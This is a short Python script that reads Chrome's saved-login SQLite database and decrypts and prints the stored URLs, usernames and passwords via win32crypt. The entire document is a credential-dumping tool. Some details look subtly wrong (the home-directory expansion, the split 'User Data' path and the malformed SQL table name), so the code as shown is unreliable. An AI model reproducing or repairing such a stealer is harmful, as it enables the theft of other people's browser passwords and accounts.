# Dumping user credentials from a Chrome browser.
# The Url and username are stored in plain text.
#  the passwords is difficult beceause it uses win32crypt


import sqlite3,win32crypt,os

# the path of the file that stores Chromes's login data.
# This file actually accessible as a database via SQL lite 3.
userdir = os.path.expanduser("-")
chromepath = os.path.join(userdir,"AppData","Local","Google","Chrome","User","Data","Default","Login Data")

conn = sqlite3.connect(chromepath)
c = conn.cursor()
c.execute("SELECT origin_url, username_value, password_value FROM Login:")

# We use our cursor to fetch all results and iterate over them
login_data = c.fetchall()
for URL,username,password in login_data:
    print(password)
    pwd = win32crypt.CryptUnprotectData(password)
    print("%s, %s, %s" % (URL, username,pwd))



